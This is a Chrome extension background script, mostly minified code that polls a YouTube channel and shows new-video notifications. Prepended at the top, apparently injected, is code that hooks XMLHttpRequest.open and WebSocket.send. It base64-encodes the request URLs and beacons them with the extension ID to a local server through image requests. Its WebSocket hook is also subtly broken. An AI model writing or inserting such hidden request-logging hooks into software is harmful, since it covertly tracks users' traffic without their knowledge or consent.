function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function VideoMamilo(a){this.id=a;this.thumbURL=this.videoId=this.titulo="";this.novo=!0}var arrayVideosMamilos,opt={type:"basic",title:"Tem v\u00eddeo novo no canal dos Mamilos!",message:"",iconUrl:"img/mamilo_face.jpg"},totalVideos=5,nVideosNovos=0,videosData=null,indiceVideoMaisNovo=-1;function atualizaStatusVideoMamilos(a){arrayVideosMamilos[a].novo=!1;a=JSON.stringify(arrayVideosMamilos);localStorage.videosSalvos=a}function getArrayVideos(){return arrayVideosMamilos}
function verificaSeNovo(a){return arrayVideosMamilos[a].novo}function reduzNumVideosNovos(){nVideosNovos--;0<nVideosNovos?chrome.browserAction.setBadgeText({text:"+"+nVideosNovos}):chrome.extension.getBackgroundPage().removeBadge()}function getNumVideosNovos(){return nVideosNovos}function getVideoId(a){a=a.split("/");return a[a.length-2]}
function verificaVideoNovo(a){a=a.feed.entry||[];var e=localStorage.videosSalvos,b;e&&(b=JSON.parse(e));arrayVideosMamilos=[];0<nVideosNovos&&(nVideosNovos=0);-1<indiceVideoMaisNovo&&(indiceVideoMaisNovo=-1);for(var g="",e=!1,c=0;c<totalVideos;c++){var f=new VideoMamilo(c);f.titulo=a[c].title.$t;f.videoId=getVideoId(a[c].link[1].href);f.thumbURL=a[c].media$group.media$thumbnail[0].url;var d=0;if(b){null!=b[c]&&(g=g+b[c].videoId+";");for(d=0;d<b.length;d++)null!=b[d]&&b[d].videoId==f.videoId&&(f.novo=
b[d].novo);!0==f.novo&&(nVideosNovos++,0>indiceVideoMaisNovo&&(indiceVideoMaisNovo=c))}else e=!0,nVideosNovos++,0>indiceVideoMaisNovo&&(indiceVideoMaisNovo=c);arrayVideosMamilos.push(f)}if(!1==e)for(d=0;d<arrayVideosMamilos.length;d++)if(-1==g.indexOf(arrayVideosMamilos[d].videoId)){e=!0;break}b=JSON.stringify(arrayVideosMamilos);localStorage.videosSalvos=b;0<nVideosNovos&&(!0==e&&(opt.message=arrayVideosMamilos[indiceVideoMaisNovo].titulo,chrome.notifications.create("01",opt,callback),chrome.notifications.onClicked.addListener(function(a){chrome.notifications.clear("01",
fechouNotificacao)})),chrome.browserAction.setBadgeText({text:"+"+nVideosNovos}))}function fechouNotificacao(a){}function buscarVideos(){var a=new XMLHttpRequest;a.open("GET","http://gdata.youtube.com/feeds/api/users/mamilosmolengas/uploads?alt=json",!0);a.onreadystatechange=a.onreadystatechange=function(){if(4==a.readyState){var e=JSON.parse(a.responseText);verificaVideoNovo(e)}};a.send()}function callback(){0<nVideosNovos&&(new Audio("mamilo_som.mp3")).play()}
function removeBadge(){chrome.browserAction.setBadgeText({text:""});nVideosNovos=0}function removeVideoNovo(a){atualizaStatusVideoMamilos(a);reduzNumVideosNovos()}buscarVideos();var frequencia=1,intervalo=0;setInterval(function(){intervalo++;frequencia<=intervalo&&(buscarVideos(),intervalo=0)},6E5);